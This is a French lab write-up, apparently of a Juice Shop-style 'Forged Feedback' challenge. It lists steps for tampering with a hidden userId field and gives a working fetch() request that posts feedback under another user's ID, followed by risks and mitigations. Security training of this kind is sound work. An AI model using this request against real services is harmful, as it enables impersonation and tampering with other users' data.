# Broken Acces Control-3-Forged Feedback

## 1. Méthodologie

   1.se rendre dans la section commentaire.
   2.tester en faisant un commentaire.
   3.inspecter la page commentaire. 
   4.trouver un input avec userId.
   5.essayer de changer la valeur de l'userId:
        a.voir sa valeur: document.getElementById('userId').value
        b.essaye de changer la valeur:  document.getElementById('userId').value = "1"
        c.envoyer un commentaire.          
   6.la page actualise avant l'envoie du commentaire.
   7.bloquer avec une injection de JSON avec :  fetch('/api/Feedbacks', {
                                                    method: 'POST',
                                                    headers: { 'Content-Type': 'application/json' },
                                                    body: JSON.stringify({
                                                        comment: 'Forged feedback test',
                                                        rating: 4,
                                                        UserId: 1
                                                    })
                                                    }).then(r => r.json()).then(console.log)
    8.renvoie le commentaire.
    9.usurpation d'Id reussi.

**techniques utilisées**
   
   -injection de JSON

## 2. Vulnérabilités

-**type :** Injection JSON
-**composant affecté :** faille de securite dans l'api
-**Séverité estimée :**Critique

## 3.Risques

- Usurpation d’identiter
- Manipulation de la base de données
- IDOR (Insecure Direct Object Reference)
- Perte de confiance des utilisateurs
- Atteinte à l’intégrité des données 
- Possibilité d’escalade de privilèges 
- Responsabilité légale

## 4.Actions

-**Mitigation :**
   - Ne jamais faire confiance aux données du client
   - Validation stricte des entrées (Input Validation)

-**Correctifs :**
   -Contrôles d’autorisation (Authorization checks)
   - Mass Assignment Protection


-**Bonnes pratiques :**
   - Principe du moindre privilège
   - Séparer les responsabilités
